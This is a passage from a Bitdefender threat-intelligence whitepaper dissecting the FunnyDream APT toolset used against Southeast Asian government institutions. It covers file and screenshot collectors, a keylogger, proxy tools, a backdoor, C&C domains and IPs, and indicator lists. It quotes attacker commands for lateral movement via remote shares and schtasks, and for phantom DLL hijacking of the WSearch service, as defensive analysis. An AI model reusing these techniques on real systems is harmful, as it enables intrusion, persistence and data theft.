the same manner as ccf32.exe:\n\n\uf09f\t C:\\Windows\\system32\\cmd.exe /c \u201ccopy c:\\users\\public\\bin\\filepak.exe \\\\<remote host>\\c$\\users\\public\\ \n\n/Y\u201d\n\n\uf09f\t schtasks  /create /s <remote host> /u \u201c<user>\u201d /p \u201c<password>\u201d /ru \u201cSYSTEM\u201d /tn one /sc MONTHLY /tr \u201cc:\\\n\nusers\\public\\filepak.exe 20191101\u201d /F\n\nAll samples of that component related to the case have the \u201cC:\\works\\prjs\\filepak\\Release\\filepak.pdb\u201d pdb path set \nand are deployed under the same name \u201cfilepak.exe\u201d. Another observation about the FilePak is that it was deployed \nexclusively by FunnyDream backdoor, that fact being illustrated in the presented timeline. \n\nAt runtime, the executable checks if another instance is already running by invoking the CreateFileA function with \nCREATE_NEW flag on the file \u201czt\u201d (located in the same folder as the executable itself).  It then checks if there is at least \none command line argument and parses the first one. The first argument should contain at least 8 characters, the first \n8 being the representation of a timestamp in the \u201cyyyymmdd\u201d form (e.g. \u201c20191101\u201d). All remaining characters of the \nfirst argument, if such exists, are used as a key for a XOR operation, which will be described below.\n\nNext action is the listing of all logical drives (excluding CDROMs and some directories like \u201cc:\\windows\\\u201d) to collect all \nfiles that have a particular extension and a LastWriteTime greater than the timestamp given as argument. The list of \nextension is hardcoded in the executable and is the same in all binaries we found - \u201cdoc;docx;ppt;pptx;xls;xlsx;pdf;\u201d.\n\nIf a file matches the criteria, it is represented as a binary blob, and that blob is appended to the file \u201cpak\u201d (located in the \nsame directory as the executable). The binary blob has a specific format presented in the next image:\n\nFig. 9 - Archive blob format\n\nThe file content is compressed with zLib algorithm and then is obfuscated with a XOR operation using the string key \nfrom the command line or the \u201cqwerasdf\u201d string if the command line argument doesn\u2019t contain the key. The file name is \nobfuscated using XOR with the same key as the compressed file content. The file content may be uncompressed if the \ncompression size is greater than the actual file size, the first segment being corresponding initialized.\n\nAfter the collection process is done, the \u201cpak\u201d file is renamed under the \u201cpak.z\u201d name.\n\n15\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nScreenCap\n\nThe ScreenCap component, as the name suggests, has the capability of taking screenshots and was discovered during \nthe analyzing of the DLL_Deploy binaries from our collection. \n\nThe DLL_Deploy binary (e.g. e2d5565c2d5b5621b2272ea01e3a18d6) for this component has a specific pdb path set - \n\u201cE:\\Works\\self2\\screencap\\builder\\builder_mul\\Release\\Dll_deploy.pdb\u201d. \n\nIts responsibility is to extract the template binary and to customize it by writing a config buffer next to the \u201cprettygirl\u201d \nstring. The config looks like:\n\nFig. 10 \u2013 ScreenCapconfig\n\nAfter the customization, the ScreenCap is dropped to \u201cC:\\ProgramData\\winscr\\winscr.dll\u201d and it is set to persist by \ncreating the \u201cHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\winscru\u201d registry key and \nassigning it the rundll32\u201dC:\\ProgramData\\winscr\\winscr.dll\u201d,Start string value (it creates the \u201cwinscr\u201d key value under \nHKLMRun if the process has the corresponding privileges).\n\nThe dropped ScreenCap uses the well-known chain of WINAPI function exported by Gdiplus.dll (GdiplusStartup, \nCreateDCW, CreateDIBSection, BitBlt, GdipSaveImageToFile, etc.) for screen capturing. The obtained jpeg image \nis temporarily saved as \u201cws.tmp\u201d file in the same folder where the ScreenCap is dropped. Then, the ws.tmp file is \ntransformed into a binary blob (having the same format as that used by FilePak) and is appended to an archive file. It is \nimportant to note that the file name used in the corresponding blob is obtained in the following manner:\n\nFig. 11 \u2013 File name template corresponding to a screenshot\n\nThe archive name where all blobs with screenshots are stored is obtained in a similar way:\n\nFig. 12 \u2013 Archive name template\n\n16\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nThe samples we found are using the following config: (5, 30, 8, \u201cqwerasdf\u201d, 21, \u201cC:\\users\\public\\winsf\u201d) which \nmeans that each archive will contain 30 blobs of images taken with a delay of 5 seconds. As key for obfuscation \nthe \u201cqwerasdf\u201d string will be used and all the archives will be written to \u201cC:\\users\\public\\winsf\u201d folder. An important \nobservation is that all of that happens in an infinite loop meaning that the computer screen will be monitored all the \ntime.\n\nKeyrecord\n\nThe Keyrecord component is responsible for logging keystrokes on the victims\u2019 system. It is dropped by a \ncorresponding DLL_Deploy dropper, an example of which is 8a278b97b8d33990d361149ee9921f9a.\n\nThe droppers we found have the template binary of the Keyrecod in a resource. The process of customization is similar \nto that of the ScreenCap and consists of obtaining the config buffer and writing it next to the \u201cprettygirl\u201d string. The \nconfig of Keyrecord has the folowing format:\n\nFig. 13 \u2013 Keyrecordconfig\n\nThe dropper is also responsible for creating the \u201c%APPDATA%\\maxbear\u201d folder where the Keyrecord is written \nunder a randomized name (the same format \u201c%c%c%c%c%cutil.exe\u201d used by FunnyDream droppers). Besides the \nKeyrecordDLL file, the dropper creates a .lnk file that should load the DLL file using rundll32.exe. After the .lnk is \ncreated, the dropper sets up the persistence by overwriting the default Startup folder with the %APPDATA%\\maxbear \n(the value of HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\startup is modified).\n\nThe keylogger runs an infinite loop, the block of which creates an archive file naming it like the ScreenCap does (using \nthe \u201c%s\\\\fpak_%s_%d_%d_%d_%d.z\u201d format string), starts logging the keystrokes to a \u201ctk.tmp\u201d file, and after obtaining a \nlong enough recording, it adds the log as a blob using the same format like Filepak to the archive. The file name field of \nblob corresponds to:\n\nFig. 14 - File name template corresponding to a keystroke log\n\nThe logging algorithm is illustrated in the following images:\n\n17\n\n \n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nFig. 15 - Keylogging mechanism\n\nFig. 16 \u2013 Keystroke capture\n\nFilepakMonitor\n\nA much more interesting component of the toolset is FilePakMonitor. It embeds the FilePak capabilities but in a more \ncomplex way, being directly controlled by the attackers through a protocol over TCP.\n\nThis component is brought on the victim system by using a DLL_Deploy binary (e.g. \nd3a6653b748eb5ff467149c9150762a1). \n\nThe DLL_Deploydropper can be recognized by its specific pdb path - \u201cE:\\Works\\MF\\hjbuilder2\\\nRelease\\wp_clt.pdb\u201d and, also, by the \u201cBIN\u201d resource that contains the template of the payload. The \ndropper obtains the resource buffer and adds the base64 representation of the C&C address next to \nthe \u201cprettygirl\u201d string. The d3a6653b748eb5ff467149c9150762a1 sample, for example, adds the \n\u201cQqQq8aQm9WxjB4IjM32nMFsWOpnt9GTkBGT=\u201d base64 string to the template, which is the representation of www.\nws2008update.com:18198.\n\n18\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nBefore dropping the FilePakMonitor, the dropper runs the \u201ccmd /c net stop WSearch\u201d command. Then the payload is \ndropped to the \u201cC:\\Windows\\System32\\msfte.dll\u201dand two other commands are executed - \u201ccmd /c net start WSearch\u201d \nand \u201ccmd.exe /c scconfigwsearch start= auto\u201d. \n\nThe goal of the executed commands in combination to the file path used by the dropper is to achieve stealth and \nprivilege escalation. By setting the WSearch service to start automatically, the attackers ensure persistence as well.\n\nThis mechanism is called \u201cPhantom DLL Hijacking\u201d because msfte.dll does not exist by default on Windows system, \nbut C:\\Windows\\system32\\SearchIndexer.exe (corresponding binary for WSearch service) tries to load that DLL each \ntime it starts. Moreover, the WSearch service runs with SYSTEM privileges, which means that the msfte.dll file will be \nexecuted as SYSTEM as well.\n\nSome of the paths where DLL_Deploy dropper was located are presented in the next table:\n\n%USERS%\\public\\y54947.exe\n\n%USERS%\\Public\\M93732.exe\n\n%USERS%\\public\\x4984.exe\n\nThe FilepakMonitor component has the \u201corign.dll\u201d ExportName and the corresponding \u201cE:\\Works\\MF\\oclt\\rlsdll\\orign.\npdb\u201d pdb path. It exports two functions, called \u201cStart\u201d and \u201cStartD\u201d.\n\nInterestingly, all the samples of FilePakMonitor try to inject themselves into the \u201cBka.exe\u201d process. The injection \nhappens in the \u201cStart\u201d function. The DllMain function checks if the process that loaded the DLL has the \u201cBka\u201d substring \nexiting if not.\n\nThe samples that are dropped under the \u201cmsfte.dll\u201d name have a more complex logic. In the DllMain of such DLL, the \nprocess name is checked for \u201cBka\u201d substring but also it is checked if the name differs from rundll32, in which case the \nStart function is executed. \n\nDuring the injection, a \u201cBka.exe\u201d process is created, and using VirtualAllocEx, WriteProcessMemory and \nCreateRemoteThread, the process is forced to load the DLL component.\n\nThis component collects files with a specific extension from a hardcoded list similar with that presented in the FilePak \ncomponent (\u201cdoc;docx;ppt;pptx;xls;xlsx;txt;pdf;\u201d). \n\nThe file listing action processes all logical drives and it is triggered every 12 hours. The first listing targets files that \nhave the extension included in the hardcoded list and the last change to the file was made no more than 20 days ago. \nAfter the first listing is completed, a SYSTEMTIME structure with current time is written to the \u201cft.data\u201d file located in \nthe same folder as the module. That structure will be updated after each file listing and, starting with the second listing, \nthe FilePakMonitor will collect only files that were changed after the last listing (the ft.data SYSTEMTIME structure will \nbe used). This means that we are dealing with a component that monitors all files for changes and collects them for \nexfiltration. Moreover, all files that matches the criteria are added to a \u201cfpak_<current tick count>.z\u201d archive in the same \nfolder with the module having the same format like that used by FilePak.\n\nAnother interesting capability of the FilePakMonitor is the removable drive insertion detection and file collection from \nremovable devices. This is done by creating a window that intercept the WM_DEVICECHANGE events with parameters \nDBT_DEVICEARRIVAL or DBT_DEVNODES_CHANGED. If such an event occurs, then all removable drives are listed and \nall files are added to a new archive, which later is uploaded to C&C.\n\nThe folder with archives is listed every 60 seconds and if any file with a name having the \u201cfpak\u201d prefix and \u201c.z\u201d extension \nis detected, then a message to the C&C is sent and in a separated thread.The module receives commands to list the \nfolder with archived or to upload one or more archives. \n\n19\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nTcpBridge\n\nThis tool is used to obtain access to the internal network of the victim. \n\nWe found only one sample of this tool used in the investigated attack and this is \ncd4ddac604e440197fb6838cc1fca313. Its pdb path is \u201cC:\\works\\prjs\\tcp_bridge_proxy\\tbp_clt\\Release\\tbp_clt.pdb\u201d. \nThe location of the project is the same as the one used for Funnydream and Filepak, which suggests that it is custom \nmade.\n\nThe executable accepts 2 command line arguments, an IP address and a port, as the usage message states:\n\n\u201cusage: tcp_bridge_clt.exe bridge_ipbridge_port\u201d\n\nThe IP address to which the tool connects is assigned to the attacker\u2019s server that sends to the tool commands to \nconnect to a given IP address and to push incoming traffic through that connection and to send back the outcoming \ndata.\n\nThe Tcp Bridge tool was located in a few locations as:\n\n%COMMON_APPDATA%\\tbp_clt21.exe\n\n%USERS%\\public\\downloads\\tbp_clt21.exe\n\n%USERS%\\public\\libraries\\googleupdat.exe\n\n%USERS%\\public\\libraries\\asf32.exe\nAnalyzing the command line data feed, we identified 3 different command line arguments given to the executable:\n\n\u2022 \n\u2022 \n\u2022 \n\n58.64.184.203 443\n58.64.209.83 443\n58.64.209.83 8888\n\nTcp_transfer\n\nAnother tool related to the FunnyDream toolset is the so called TcpTransfer. The specific details of this tool are its \n\u201ctcp_transfer.exe\u201d Export Name and the \u201cC:\\works\\self\\tcp_transfer\\Release\\tcp_transfer.pdb\u201d pdb path.\n\nWe were able to find only 2 samples of the tool used in this attack:\n\n\uf09f\t 88e486dc8f876359617870c999d9b1d2 (C&C address - 154.216.2[.]135)\n\uf09f\t 470bcfdf9e7aad3831d84a04d75337ab (C&C address - 58.64.184[.]201)\n\nThe executable binds to \u201c0.0.0.0:8080\u2019 address and starts listening for local connection. For each incoming connection \non the local address, it creates a new connection to the C&C and start receiving and sending the data.\n\nThe goal of such tool is to bypass network restriction such that the compromised machines that are not connected \ndirectly to the internet can communicate with the C&C through another compromised machine that has an internet \nconnection.\n\n20\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nMd_client\n\nThe Md_client module is another custom made backdoor like component with the \u201cC:\\works\\prjs\\MD\\md_client\\\nrlsexe\\md_client.pdb\u201d pdb path and the \u201cprettygirl\u201d string that matches the known pattern of the toolset. Also, there \nare some RTTI artefacts present in binaries that can be found in the FilePakMonitor binaries (e.g. FileTransmitBase, \nFileTransmitDownload and FileTransmitUpload class names). \n\nFurthermore, the samples we found connect to subdomains of wmiprvse[.]com.\n\nThis component uses the UDP and the 53 port to communicate with the C&C server and is capable of:\n\n\uf09f\t Collecting system information like computer name, user name, osverion, processor architecture;\n\uf09f\t Creating a remote shell by running a cmd.exe with stdin/stdout/stderr \u201cconnected\u201d to the C&C\n\uf09f\t Sending the Logical Drive Strings\n\uf09f\t Listing a directory\n\uf09f\t Uploading and downloading a file\n\uf09f\t Deleting a directory\n\uf09f\t Executing a command using ShellExecuteW\n\uf09f\t Executing a command using CreateDesktop (\u201cmydktop1\u201d) and CreateProcess\n\nC&C infrastructure\n\nThe domains or IP addresses of command and control servers are hardcoded in binary files. For each component, the \ntable below illustrates the C&Cs found in samples. \n\nChinoxy\n\nPcShare\n\n58.64.184[.]209\n\nwww.eofficeupdate[.]com\n\nwww[.]goog1eupdate[.]com\n\nwww.msdtcupdate[.]com\n\nwww.mfaupdate[.]com\n\nwww.bitupdating[.]com\n\nwww.iatupdate[.]com\n\nwww.igfxpers[.]com\n\nFunnydream\n\nwww.eofficeupdating[.]com\n\nFilePakMonitor\n\nTcpbridge\n\nlotus.wmiprvse[.]com\n\ncloud.wmiprvse[.]com\n\nwww.wmiprvse[.]com\n\nupdate.wmiprvse[.]com\n\nwww.ws2008update[.]com\n\n58.64.184[.]203\n\n58.64.209[.]83\n\n21\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nTcp transfer\n\nMd_client\n\n154.216.2[.]135\n\n58.64.184[.]201\n\ncloud.wmiprvse[.]com\n\nwww.wmiprvse[.]com\n\nupdate.wmiprvse[.]com\n\nMost of the infrastructure is located in Hong Kong, except for three servers: one in Vietnam, one in China and one in \nSouth Korea.\n\nFig. 17 \u2013 C&C geolocation\n\n22\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nFig. 18 \u2013 Domain Activity Timeline\n\nAll of these domains used by attackers were registered using the same email address \u201cnewday20180314@outlook.\ncom\u201d. However, the list of domains registered using this address is more extensive:\n\n\uf09f\t leapconfig[.]com \n\uf09f\t updateui[.]com \n\uf09f\t realteke[.]com \n\uf09f\t ksdeui[.]com \n\uf09f\t msseces[.]com \n\uf09f\t osppsvc[.]com \n\uf09f\t nissrv[.]com \n\uf09f\t unikeyupdating[.]com \n\uf09f\t unikeyupdate[.]com \n\uf09f\t mdnsresponder[.]com \n\uf09f\t winserverupdate[.]com \n\uf09f\t wmiprvse[.]com \n\uf09f\t igfxpers[.]com \n\uf09f\t bitupdating[.]com \n\uf09f\t eofficeupdate[.]com \n\uf09f\t mfaupdating[.]com \n\uf09f\t mfaupdate[.]com \n\uf09f\t bkavutil[.]com \n\uf09f\t eofficeupdating[.]com \n\uf09f\t igfxsrvc[.]com \n\uf09f\t ws2008update[.]com \n\uf09f\t ksdeupdate[.]com \n\uf09f\t iatupdate[.]com \n\uf09f\t iumsvc[.]com\n\n23\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nAttribution\n\nAttributing APT style attacks to a particular group or country can be extremely difficult, mostly because forensic \nartefacts can sometimes be planted intentionally, C&C infrastructure can reside anywhere in the world, and the tools \nused can be repurposed from other APT groups. \n\nWhile having a C&C infrastructure based in the same region as the victims isn\u2019t usually considered a sign that attackers \nshare the same geographical region, the internet infrastructure within that particular region is highly restrictive. \nIt\u2019s likely that relying on a locally deployed C&C infrastructure would bring several advantages to the APT group. \nFor instance, it could be easier to manage and control, while at the same time the C&C IPs wouldn\u2019t be flagged as \nsuspicious, as they would be part of the same regional internet infrastructure. Opting for a command and control \ninfrastructure deployed anywhere else in the world would have potentially raised some security alarms.\n\nDuring this analysis, some forensic artefacts seem to suggest a Chinese-speaking APT group, as some of the \nresources found in several binaries had a language set to Chinese, and the Chinoxy backdoor used during the \ncampaign is a Trojan known to have been used by Chinese-speaking threat actors. \n\nWhile we\u2019re constantly monitoring for APT-like activity around the world, not all APT-style attacks can be attributed to a \nknown APT group, mostly because some of the used the tools are sometimes share between multiple groups. \n\nIOCs\n\nAn up-to-date and complete list of indicators of compromise is available to Bitdefender Advanced Threat \nIntelligence users. More information about the program is available at https://www.bitdefender.com/oem/advanced-\nthreatintelligence.html\n\nHashes\n\nComponent \nccf32/ccf64 \n\nSha256 \n1cd8b6f1e2d49e6605f5ae695ea126eee8c82264a9644758126a4c30662ce9d5 \n\n91dfbee660be3d11f8a631b4bbf552d0ee60ec908f4d0817643d591726d53bfd \n\nChinoxy dropper \n\n69c1f791402e36a360a901e3e42c177b02281a84c275a228b00b86596636fa95 \n\n8ff4979b40ffcef7eedcfeb6fb4fecb42aceb53bc816dc4d36428e12ad67d051 \n\ne5365d81ee31e9b86ea14e1ee7abf0809337f3bc9e7b00d7492c2caed4ca5f36 \n\nc01110788b9345b5564c1b5b0876a27e1b2501b19b90280054026e89f68a4f48 \n\nChinoxy Backdoor \n\n2d20fc0fd6ef07c367761abe97762f044e90e428addd9a9af7b6cf88087d455b \n\nPcShare dropper \n\nf3b16798054a4510650682e17ae5bc12d27b460eac8314318eeda5e0488869dc \n\n6f7f142089b1d2e48880f59362c7c50e5d193166bdd5e4b27318133e8fe27b2c \n\n9670563876caa2587d4001d3cbda11a4ca4601fd9f0555ec9468f4796fce7ae6 \n\n26afbe3cab4967cb48ada596959ef77367da9cb194c71db77ebe1fcbe7aabf6f \n\n0a2a047c2b670f7da11a7d72e2ab3b867eebb6ccbe3ccad92817a6e74ac343a2 \n\n70891a33bcd94e40cdbb0660b983dd7dc439005b2cae614c7b7504fd24eb8696 \n\n942e810563d142c949215dbe38562f1ffb31d4b9afc8a98047d97ed2e7ece478 \n\n24\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nPcShare loader\n\nf976a52f2d82e608f95e95d41e2eacad58e19a9e9cb92f061090d72fd2703413\n\nf262662bd9c78137837e5943f891da3b520095668c0592bc11c0dc742db0640a\n\n9a3829bd0a4dd7b72c54d1aed972f91aede57357d7a9dcd3d9f8b8d192189a03\n\ne61649ac70198e223c123ad29c7d02ebe4fe6da7f35282d26bd93d466e85176d\n\nf6f9d0620db35c1f6a3fad9c9bc6d7aaf6594355b606bce2b9513aa721679d95\n\n139d4c31f1dfd17b74506931622d12c537d597c85e52a58065cf3a917b469aea\n\na224ab4d8ca5ed62755b1b7f36ce6c80e89a684d1e792400d8fa889b1860fcc6\n\n311f3011172618c95fcf339ac3ddce10c415c95215eb6cea60d5eb9b00a5de51\n\n0f5cac319750d37eb6a7d38c1deec7d5839c642287b48b0fb8a1921185b521f1\n\nf76847bed642a92d3a5fac4782d0ae2a140203579f43f7b3c8db4090853986ad\n\n7b524c3bdd5d5474b6e050084e3f32d2bf7f5c4539b44221e4bc2987b2deb56d\n\n8d3b5825690d4f893cc577b22cbe3c12232b9895c9a0417b750ba722e8851d6d\n\n4caab78b44c288406b3d66feab853a399c72b237e244993434dd6206013cc371\n\n8c49d7f83af949f4145d5da32c308ef98ebfc5fce030a405bf2b6855a8a0575e\n\nPcMain\n\n85bd4f36c20222d1e0a1908bb2befd9a19d9e476ef8fdffa8c7b2f14ec22ce01\n\nMD_Client\n\n631c62e067667a02da63a97aeeb556bece8394deee59e62b48f63baecf4cf613\n\n7ecba3270ff06c5d618a78c4e471f457e8672211bb8cdd4aa58b6516ea5fe603\n\nf7356689c3c4caca57d7edd4a45ac3a2cfa672ccf444e80a69fd271210d320f3\n\nFilePakMonitor\n\n25ce8296bc4da119093d847afc18ee030a4c94a39066732227a73f8908c40292\n\n2e6dfca6b2b8a11d6eb8933bd7ed7f17ca46499a3ee548bbb086406eb57b2204\n\n28570122e952f25c92dfb83707c502a5036b9f99770127435cbb8c7e6796cce4\n\na276a0e01b5024f46ef1a05a5e9810c39b8757a0cea665519bf619bf35604008\n\na78dace0fd8c043016406f99f0103cd7ebee67e21261c0097efe6072bfc680b0\n\n58f88767a4599a95f29048852f92afe52a32b646ffdd50291cd1be5a97ebe7ea\n\n2fdc7963612be26b8c13ed59572bd2785c1d11da15494c34a0f1632530fddf64\n\n409e95e0824c4e80450196dbde2e64a2424d3e724760e471c1e68d3fb67dec24\n\nFunnyDreamTcpBridge\n\n915af21d627f5bec059800bb9740a228e93fae8dd4fd574bd4d2812c7d6adf8d\n\nFunnyDreamTcpTransfer\n\n32cabf2952f88283251c36751e04a45bfa78cdb0835460619d4812b882795c03\n\nFunnyDreamKeylogger\n\naaf9ce055918b0092bba7db26816237170870601614155defe143986b5dac8fe\n\n63e8488de30c9b615c76d4e568f0a1b738fcad665e58571c299d8e9d7752a637\n\nFunnyDreamScreenCap\n\n2bf0b8453c5f5a3f616894d72acb61868bb6c75403891411a123eceb6d0f9f9b\n\n05f9a809a6800112fa1e02975489974d003d55810a4cfb11a0705e8a427ea734\n\n46e1381c0228502276f1eb3b755f9f34f6a6d4ffbbecc95bde852ddf40e09ad8\n\n74b8030c67320030998e8f58da4a6215dd4cc4c0aef7863c5fc8a1985cbf22a4\n\nFunnyDreamFilePak\n\n9a63d810f69eb35ee8ee3797bd1574e08b67f31c0e368bf9cf01202f5f73c664\n\nFunnyDreamBackdoor\n\n7d92c7bc22dc95526a0c8713211b9bcfe85cac2c4a760067e69992afa19efbe5\n\n1aa170383d473b6adb16032942b34eb136dd013ea8e2f5cc8fec7356a92191b3\n\n455d890479f1137797bfb32e6f5f1a4634a69c11654bb5ec0b6710a25418a12e\n\nba3d8ff9b3f6b6223dd33dee15321e267cc28627723e68cd632e59d85c529330\n\n780739a25d90fd850e82792d59de4c04530337e79cd4b7a3149f229b75a7d5ce\n\n682df3d96cf40a24637905d9ab7a62e3dd0777a1320b078bc89951076f842744\n\n47519ef2e613fd17b18e885bb09cfa1e047feaa86d6d16d3916d14c3b244c533\n\n5e90afbdfb63110fa3c9cdd79ef474852996a895a6bad66a663e2ccc51dd339b\n\nDll_Deploy\n\n145ec6dac68fe28857220db70575c5f97540c901509e1b009ecb7857047d0bfd\n\n5648ba8ba4d1dd623f82fb9adebcf87085a8a619147e7979ea08f763ab69b0cb\n\nc41fa483bd7e186d754d592405d4649adcb78192b3a66586e526ecb6be0f17b5\n\naefe49a247322d3bbefc9e29d30c809499518b947a88d0c2ac9e11cf735b1544\n\n80a1fd088d0153a0c33fd606660f9d8e82349cdb6fade850cc06e07fe6732d4b\n\ne97ac9089fa80dc38e8fe920008c117d93203e45a1516d24b59f17f7055b8ced\n\n25\n\n\fBitdefender DracoTeam \u2022 WHITEPAPER\nDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nMutexes\n\n_mhello_scrream\n_mhello_hidream\n_mhello_xhdream\n_mhello_krcream\n\nEvents\n\n_zent0\n_endznt0\n_zkent0\n\nPaths\n\nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\U8VCQutil.exe  \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\BDPTSutil.exe \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\H7kSFutil.exe   \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\I7YaOutil.exe  \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Y7KFPutil.exe  \nC:\\Users\\<username>\\AppData\\Roaming\\maxbear\\Q7RK1util.exe \n%PUBLIC%\\libraries\\winmsg.dll \n%COMMON_APPDATA%\\microsoft\\netframework\\winmsg.dll \n%PUBLIC%\\bin\\winmsg.dll \n%PUBLIC%\\libraries\\winuser.dll \n%COMMON_APPDATA%\\wmiutil.dll \n%PUBLIC%\\libraries\\wmihelp.dll \nC:\\Users\\<user>\\appdata\\local\\temp\\unikeytn.exe \n%COMMON_APPDATA%\\microsoft\\netframework\\vssvb.exe \n%COMMON_APPDATA%\\conhosts.exe \n%PUBLIC%\\libraries\\conhosts.exe \nC:\\ProgramData\\winscr\\winscr.dll\nC:\\users\\public\\winsf\n%APPDATA%\\maxbear\n%COMMON_APPDATA%\\tbp_clt21.exe \n%USERS%\\public\\downloads\\tbp_clt21.exe \n%USERS%\\public\\libraries\\googleupdat.exe \n%USERS%\\public\\libraries\\asf32.exe \n%COMMON_STARTUP%\\\\eoffice.exe\n%LOCALAPPDATA%\\microsoft\\windows\\explorer\\update\\wuauong.tlb\nC:\\Users\\Public\\ccf32.exe \nc:\\users\\public\\bin\\filepak.exe\n%USERS%\\public\\y54947.exe \n%USERS%\\Public\\M93732.exe \n%USERS%\\public\\x4984.exe\n\n26\n\n\fDissecting a Chinese APT Targeting South Eastern Asian Government Institutions\n\nBitdefender DracoTeam \u2022 WHITEPAPER \n\nFile Mappings\n\n7f8b6a244035c9e5b\n55fc3f9a654c50093\n\n27\n\n\fWHY BITDEFENDER?\n\nUNDISPUTED INNOVATION LEADER.\n38% of all cybersecurity vendors worldwide integrated \nat least one Bitdefender technology. Present in 150 \ncountries.\n\nWORLD\u2019S FIRST END-TO-END BREACH AVOIDANCE\nThe first security solution to unify hardening, prevention, \ndetection and response across endpoint, network and \ncloud.\n\n#1 RANKED SECURITY. AWARDED ACROSS THE BOARD.\n\nl\n\n-\n\nN\nE\n_\nn\ne\n-\n4\n3\n9\n4\nt\na\ne\nr\nc\n-\ny\nn\nO\ne\ns\nU\nb\ne\nW\nT\nP\nA\n_\nN\nC\n-\nr\ne\np\na\np\ne\nt\ni\nh\nW\nT\nD\n-\nr\ne\nd\nn\ne\nf\ne\nd\nt\ni\nB\n\n-\n\n0\n2\n/\n6\n1\n/\n1\n1\nm\np\n0\n2\n9\n0\n2\n0\n2\n\n:\n\n,\n\n6\n1\nr\ne\nb\nm\ne\nv\no\nN\n0\n2\n/\n0\n1\n/\n1\n1\n\nFounded 2001, RomaniaNumber of employees 1800+ Headquarters Enterprise HQ \u2013 Santa Clara, CA, United StatesTechnology HQ \u2013 Bucharest, RomaniaWORLDWIDE OFFICESUSA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX | Toronto, CAEurope: Copenhagen, DENMARK | Paris, FRANCE | M\u00fcnchen, GERMANY | Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona, SPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDSAustralia: Sydney, MelbourneUNDER THE SIGN OF THE WOLFA trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can win \u2014 a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand, and one million times out of one million.And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight, but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our collective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against all dangers hidden in the arcane intricacies of the digital realm.This brilliance is our superpower and we put it at the core of all our game-changing products and solutions. \n \n \n \n\f"], "URLs": ["https://www.bitdefender.com/oem/advanced-"], "weight": 0.0}